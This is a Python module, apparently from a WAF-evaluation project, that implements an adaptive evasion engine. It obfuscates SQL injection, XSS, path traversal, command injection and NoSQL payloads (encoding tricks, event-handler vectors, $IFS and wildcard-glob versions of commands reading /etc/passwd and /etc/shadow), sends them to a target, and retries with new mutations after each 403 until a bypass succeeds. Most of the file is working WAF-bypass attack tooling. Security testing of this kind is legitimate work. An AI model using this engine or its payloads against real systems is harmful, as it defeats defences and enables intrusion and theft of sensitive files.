"""Adaptive Evasion Engine with Semantic-Preserving Tamper Mutations.

Task 10.3: Automatically obfuscates and mutates payloads when receiving
HTTP 403 Forbidden responses from the WAF Gateway to evaluate Adversarial Robustness.
"""

from __future__ import annotations

import json
import re
from typing import Any, Callable

from .tools import HttpDispatcher

# -----------------------------------------------------------------------------
# 1. SQL Injection Tamper Mutations
# -----------------------------------------------------------------------------


def tamper_sql_space_to_comment(payload: str) -> str:
    """Replace standard whitespace with SQL inline comments /**/."""
    # Avoid replacing spaces already inside quotes if possible, or replace general spaces
    return re.sub(r"\s+", "/**/", payload)


def tamper_sql_case_randomize(payload: str) -> str:
    """Randomize casing for SQL keywords (e.g. SELECT -> sELecT)."""
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY", "GROUP", "INSERT", "UPDATE"]
    result = payload
    for idx, kw in enumerate(keywords):
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        # Alternate casing deterministically: e.g. sELecT or SeLeCt
        def _casing(match: re.Match[str]) -> str:
            text = match.group(0)
            return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))

        result = pattern.sub(_casing, result)
    return result


def tamper_sql_double_url_encode(payload: str) -> str:
    """Double URL encode special SQL punctuation characters (' -> %2527)."""
    char_map = {
        "'": "%2527",
        '"': "%2522",
        " ": "%2520",
        "-": "%252d",
        ";": "%253b",
        "=": "%253d",
        "(": "%2528",
        ")": "%2529",
    }
    result = []
    for char in payload:
        result.append(char_map.get(char, char))
    return "".join(result)


def tamper_sql_between_operator(payload: str) -> str:
    """Replace simple equality comparisons like '1=1' with '1 BETWEEN 1 AND 1'."""
    pattern = re.compile(r"(\d+)\s*=\s*(\d+)")
    return pattern.sub(r"\1 BETWEEN \2 AND \2", payload)


def tamper_sql_versioned_comment(payload: str) -> str:
    """Wrap sensitive SQL keywords in MySQL/SQLite style versioned comments /*!50000...*/."""
    keywords = ["UNION", "SELECT"]
    result = payload
    for kw in keywords:
        pattern = re.compile(rf"\b{kw}\b", re.IGNORECASE)
        result = pattern.sub(f"/*!50000{kw}*/", result)
    return result


# -----------------------------------------------------------------------------
# 2. XSS Tamper Mutations
# -----------------------------------------------------------------------------


def tamper_xss_case_randomize(payload: str) -> str:
    """Randomize tag casing in XSS payloads (<script> -> <sCrIpT>)."""
    pattern = re.compile(r"<(/?)([a-zA-Z0-9]+)", re.IGNORECASE)

    def _tag_casing(match: re.Match[str]) -> str:
        slash = match.group(1)
        tag = match.group(2)
        mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(tag))
        return f"<{slash}{mixed}"

    return pattern.sub(_tag_casing, payload)


def tamper_xss_event_handler(payload: str) -> str:
    """Transform script tags into img/svg event handler payloads."""
    if "<script" in payload.lower():
        # Extract alert or function inside script
        m = re.search(r"<script.*?>(.*?)</script>", payload, re.IGNORECASE | re.DOTALL)
        inner = m.group(1).strip() if m else "alert(1)"
        if not inner:
            inner = "alert(1)"
        return f"<img src=x onerror={inner}>"
    return payload.replace("alert(", "confirm(")


def tamper_xss_html_entity(payload: str) -> str:
    """Replace special brackets with decimal or hex HTML entities."""
    return payload.replace("<", "&#x3C;").replace(">", "&#x3E;")


def tamper_xss_double_url_encode(payload: str) -> str:
    """Double URL encode XSS special punctuation (< -> %253c)."""
    char_map = {
        "<": "%253c",
        ">": "%253e",
        '"': "%2522",
        "'": "%2527",
        "(": "%2528",
        ")": "%2529",
    }
    result = []
    for char in payload:
        result.append(char_map.get(char, char))
    return "".join(result)


# -----------------------------------------------------------------------------
# 3. Path Traversal Tamper Mutations
# -----------------------------------------------------------------------------


def tamper_path_double_encode(payload: str) -> str:
    """Double URL encode directory traversal separators (../ -> ..%252f)."""
    return payload.replace("../", "..%252f").replace("..\\", "..%255c")


def tamper_path_nested_traversal(payload: str) -> str:
    """Use nested traversal sequences (....// -> ../ after single-pass sanitization)."""
    return payload.replace("../", "....//").replace("..\\", "....\\\\")


def tamper_path_backslash_substitute(payload: str) -> str:
    """Replace forward slashes with Windows style backslashes."""
    return payload.replace("/", "\\")


def tamper_path_null_byte_extension(payload: str) -> str:
    """Append null byte dummy extension (%00.jpg)."""
    if not payload.endswith(".jpg") and not payload.endswith(".png"):
        return f"{payload}%00.jpg"
    return payload


# -----------------------------------------------------------------------------
# 4. Command Injection Tamper Mutations
# -----------------------------------------------------------------------------


def tamper_cmd_whitespace_ifs(payload: str) -> str:
    """Replace spaces in command injections with $IFS."""
    return payload.replace(" ", "${IFS}")


def tamper_cmd_quote_concatenation(payload: str) -> str:
    """Concatenate shell commands with quotes (cat -> c'a't)."""
    commands = ["cat", "passwd", "echo", "sh", "bash", "base64", "id", "whoami"]
    result = payload
    for cmd in commands:
        pattern = re.compile(rf"\b{cmd}\b")
        if len(cmd) >= 2:
            split_cmd = f"{cmd[0]}''{cmd[1:]}"
            result = pattern.sub(split_cmd, result)
    return result


def tamper_cmd_subshell(payload: str) -> str:
    """Wrap command arguments in subshell invocation $()."""
    if "|" in payload and "$(" not in payload:
        parts = payload.split("|", 1)
        return f"{parts[0].strip()} | $({parts[1].strip()})"
    return payload


# -----------------------------------------------------------------------------
# 5. Phase E (E1) Extended Evasion Mutators (10 New Techniques)
# -----------------------------------------------------------------------------


def tamper_hpp_query_pollution(payload: str, param_name: str = "q") -> str:
    """HTTP Parameter Pollution (HPP) duplicate-parameter marker for query contexts."""
    if payload.startswith("1&q=") or payload.startswith("safe_item&"):
        return payload
    return f"1&{param_name}={payload}"


def tamper_sqli_scientific_float(payload: str) -> str:
    """Spaceless SQLi using scientific/float numeric tokens before SQL keywords."""
    result = re.sub(r"\s*\bUNION\s+SELECT\b", "1e0UNION/*s*/SELECT", payload, flags=re.IGNORECASE)
    result = re.sub(r"\s*\bOR\b\s*", "9e0OR/*s*/", result, flags=re.IGNORECASE)
    result = re.sub(r"\s*\bAND\b\s*", "1e0AND/*s*/", result, flags=re.IGNORECASE)
    result = re.sub(r"\s+", "/*s*/", result)
    if "1e0" not in result and "9e0" not in result:
        result = f"1e0/*s*/{result}"
    return result


def tamper_sqli_char_chr_concat(payload: str) -> str:
    """Quote-free SQL CHAR(...) encoding replacing quoted string literals."""

    def _to_char_expr(text: str) -> str:
        codes = ",".join(str(ord(ch)) for ch in text)
        return f"CHAR({codes})"

    result = re.sub(r"'([A-Za-z0-9_./:@+-]+)'", lambda m: _to_char_expr(m.group(1)), payload)
    result = re.sub(r'"([A-Za-z0-9_./:@+-]+)"', lambda m: _to_char_expr(m.group(1)), result)
    result = re.sub(r"([A-Za-z0-9_.-]+)'", lambda m: _to_char_expr(m.group(1)), result)
    result = result.replace("'", "CHAR(39)").replace('"', "CHAR(34)")
    if "CHAR(" not in result:
        result = re.sub(r"\b(\d+)\b", lambda m: _to_char_expr(m.group(1)), result, count=1)
        if "CHAR(" not in result:
            result = _to_char_expr(payload)
    return result


def tamper_xss_json_unicode_escape(payload: str) -> str:
    """JSON Unicode escape encoding (< -> \\u003c, > -> \\u003e, = -> \\u003d, ' -> \\u0027)."""
    replacements = {
        "<": r"\u003c",
        ">": r"\u003e",
        "=": r"\u003d",
        "'": r"\u0027",
        '"': r"\u0022",
    }
    return "".join(replacements.get(ch, ch) for ch in payload)


def tamper_json_duplicate_key_tamper(payload: str, key: str = "comment") -> str:
    """Duplicate JSON key pollution placing a benign value before the attack key."""
    return f'{{"{key}": "benign_preview", "{key}": {json.dumps(payload)}}}'


def tamper_xss_svg_mathml_onbegin(payload: str) -> str:
    """Spaceless SVG/MathML animation event handler vector."""
    m = re.search(r"<script.*?>(.*?)</script>", payload, re.IGNORECASE | re.DOTALL)
    inner = m.group(1).strip() if m and m.group(1).strip() else "alert(1)"
    return f"<svg><animate/onbegin={inner}//"


def tamper_cmd_dollar_at_split(payload: str) -> str:
    """Unix shell $@ token splitting with ${IFS} space substitution."""
    commands = ("whoami", "cat", "passwd", "shadow", "echo", "bash", "sh", "id", "ls", "curl", "wget", "base64", "uname")
    result = payload
    for cmd in commands:
        pattern = re.compile(rf"\b{cmd}\b")
        result = pattern.sub(f"{cmd[0]}$@{cmd[1:]}", result)
    return result.replace(" ", "${IFS}")


def tamper_cmd_wildcard_glob(payload: str) -> str:
    """Filesystem wildcard globbing for POSIX binaries and paths."""
    result = payload
    path_globs = (
        ("/etc/passwd", "/???/p??s??"),
        ("/etc/shadow", "/???/s??d??"),
        ("/bin/bash", "/???/b??h"),
        ("/bin/sh", "/???/s?"),
    )
    for src, dst in path_globs:
        result = result.replace(src, dst)
    cmd_globs = {
        "cat": "/bin/c?t",
        "whoami": "/???/bin/wh??mi",
        "id": "/???/bin/?d",
        "ls": "/bin/l?",
        "echo": "/bin/e?ho",
        "uname": "/???/bin/u??me",
    }
    for cmd, glob_path in cmd_globs.items():
        result = re.sub(rf"(?<![/\w]){cmd}\b", glob_path, result)
    return result


def tamper_path_overlong_mixed_slash(payload: str) -> str:
    """Overlong UTF-8 %c0%af combined with mixed %5c..%2f traversal encoding."""
    if "../../" in payload:
        result = payload.replace("../../", "..%c0%af%5c..%2f", 1)
    elif "../" in payload:
        result = payload.replace("../", "..%c0%af%5c..%2f", 1)
    elif "..\\" in payload:
        result = payload.replace("..\\", "..%c0%af%5c..%2f", 1)
    else:
        result = f"..%c0%af%5c..%2f{payload}"
    result = result.replace("../", "..%c0%af").replace("..\\", "..%5c")
    return result.replace("/", "%c0%af")


def tamper_nosql_nin_exists_blind(payload: str) -> str:
    """MongoDB $nin + $exists blind operator injection payload."""
    _ = payload
    return '{"$nin": ["__nonexistent__"], "$exists": true}'


# -----------------------------------------------------------------------------
# Tamper Technique Catalog
# -----------------------------------------------------------------------------

TAMPER_CATALOG: dict[str, dict[str, Callable[[str], str]]] = {
    "SQL_INJECTION": {
        "inline_comment": tamper_sql_space_to_comment,
        "case_randomize": tamper_sql_case_randomize,
        "double_url_encode": tamper_sql_double_url_encode,
        "percent_encoding": tamper_sql_double_url_encode,  # Alias for actions.py
        "between_operator": tamper_sql_between_operator,
        "versioned_comment": tamper_sql_versioned_comment,
        "hpp_query_pollution": tamper_hpp_query_pollution,
        "sqli_scientific_float": tamper_sqli_scientific_float,
        "sqli_char_chr_concat": tamper_sqli_char_chr_concat,
        "json_duplicate_key_tamper": tamper_json_duplicate_key_tamper,
    },
    "XSS": {
        "case_randomize": tamper_xss_case_randomize,
        "event_handler": tamper_xss_event_handler,
        "double_url_encode": tamper_xss_double_url_encode,
        "html_entity_encoding": tamper_xss_html_entity,  # Alias for actions.py
        "xss_json_unicode_escape": tamper_xss_json_unicode_escape,
        "json_duplicate_key_tamper": tamper_json_duplicate_key_tamper,
        "xss_svg_mathml_onbegin": tamper_xss_svg_mathml_onbegin,
    },
    "PATH_TRAVERSAL": {
        "double_url_encode": tamper_path_double_encode,
        "percent_encoding": tamper_path_double_encode,  # Alias for actions.py
        "nested_traversal": tamper_path_nested_traversal,
        "backslash_substitute": tamper_path_backslash_substitute,
        "null_byte_extension": tamper_path_null_byte_extension,
        "path_overlong_mixed_slash": tamper_path_overlong_mixed_slash,
    },
    "COMMAND_INJECTION": {
        "whitespace_variation": tamper_cmd_whitespace_ifs,  # Alias for actions.py
        "whitespace_ifs": tamper_cmd_whitespace_ifs,
        "quote_concatenation": tamper_cmd_quote_concatenation,
        "subshell": tamper_cmd_subshell,
        "cmd_dollar_at_split": tamper_cmd_dollar_at_split,
        "cmd_wildcard_glob": tamper_cmd_wildcard_glob,
        "json_duplicate_key_tamper": tamper_json_duplicate_key_tamper,
    },
    "NOSQL_INJECTION": {
        "nosql_nin_exists_blind": tamper_nosql_nin_exists_blind,
        "json_duplicate_key_tamper": tamper_json_duplicate_key_tamper,
    },
}
# Alias for shorter naming
TAMPER_CATALOG["SQLI"] = TAMPER_CATALOG["SQL_INJECTION"]


class EvasionEngine:
    """Adaptive Evasion Engine orchestrating mutation rounds against the WAF."""

    def __init__(
        self,
        dispatcher: HttpDispatcher | None = None,
        max_attempts: int = 4,
    ) -> None:
        self.dispatcher = dispatcher or HttpDispatcher()
        self.max_attempts = max_attempts

    def get_available_techniques(self, family: str) -> list[str]:
        """Return list of supported tamper techniques for the given attack family."""
        canonical_family = family.upper()
        if canonical_family in TAMPER_CATALOG:
            return list(TAMPER_CATALOG[canonical_family].keys())
        return []

    def mutate(
        self,
        payload: str,
        family: str,
        technique: str | None = None,
        used_techniques: list[str] | None = None,
    ) -> tuple[str, str]:
        """Apply a semantic-preserving mutation.

        Returns:
            Tuple of (mutated_payload, technique_name_used).
        """
        canonical_family = family.upper()
        techniques = TAMPER_CATALOG.get(canonical_family, {})
        if not techniques:
            return payload, "none"

        selected_tech = technique
        if not selected_tech or selected_tech not in techniques:
            # Pick first technique not in used_techniques
            used = set(used_techniques or [])
            available = [t for t in techniques if t not in used]
            selected_tech = available[0] if available else list(techniques.keys())[0]

        mutator = techniques[selected_tech]
        try:
            mutated = mutator(payload)
            return mutated, selected_tech
        except Exception:
            return payload, "none"

    def adaptive_evasion_round(
        self,
        method: str,
        path: str,
        param_name: str,
        baseline_payload: str,
        family: str,
        request_type: str = "query",
        extra_fields: dict[str, Any] | None = None,
        bypass_keywords: list[str] | None = None,
    ) -> dict[str, Any]:
        """Execute a full multi-round adaptive evasion engagement.

        Workflow:
        1. Round 1: Dispatch baseline payload.
        2. If 403 Blocked: iteratively apply tamper mutations and re-dispatch.
        3. Terminate immediately upon confirmed bypass or reaching max_attempts.
        4. Return structured Battle Telemetry dictionary for AI Arena / logs.
        """
        rounds_telemetry: list[dict[str, Any]] = []
        used_techniques: list[str] = []

        current_payload = baseline_payload
        current_technique = "baseline_probe"
        bypassed = False
        final_threat_score: float | None = None

        for attempt in range(1, self.max_attempts + 1):
            # 1. Build request parameters or JSON payload
            params = None
            json_data = None
            if request_type == "query":
                params = {param_name: current_payload}
                if extra_fields:
                    params.update(extra_fields)
            else:
                json_data = {param_name: current_payload}
                if extra_fields:
                    json_data.update(extra_fields)

            # 2. Dispatch request
            dispatch_res = self.dispatcher.dispatch(
                method=method,
                path=path,
                params=params,
                json_data=json_data,
                bypass_detection_keywords=bypass_keywords,
            )

            final_threat_score = dispatch_res.waf_threat_score
            round_info = {
                "round": attempt,
                "technique": current_technique,
                "payload": current_payload,
                "status_code": dispatch_res.status_code,
                "is_blocked": dispatch_res.is_blocked,
                "waf_action": dispatch_res.waf_action,
                "threat_score": dispatch_res.waf_threat_score,
                "latency_ms": dispatch_res.latency_ms,
                "confirmed_bypass": dispatch_res.confirmed_bypass,
            }
            rounds_telemetry.append(round_info)
            used_techniques.append(current_technique)

            # 3. Check for bypass
            if dispatch_res.confirmed_bypass or (dispatch_res.status_code == 200 and not dispatch_res.is_blocked):
                bypassed = True
                break

            # 4. If blocked on 403, mutate for the next attempt
            if dispatch_res.is_blocked and attempt < self.max_attempts:
                current_payload, current_technique = self.mutate(
                    payload=baseline_payload,
                    family=family,
                    used_techniques=used_techniques,
                )

        return {
            "endpoint": path,
            "method": method.upper(),
            "family": family,
            "success": bypassed,
            "total_rounds": len(rounds_telemetry),
            "winning_technique": current_technique if bypassed else None,
            "baseline_payload": baseline_payload,
            "final_payload": current_payload,
            "final_threat_score": final_threat_score,
            "rounds": rounds_telemetry,
        }

    # Convenient alias for adaptive_evasion_round
    evade = adaptive_evasion_round

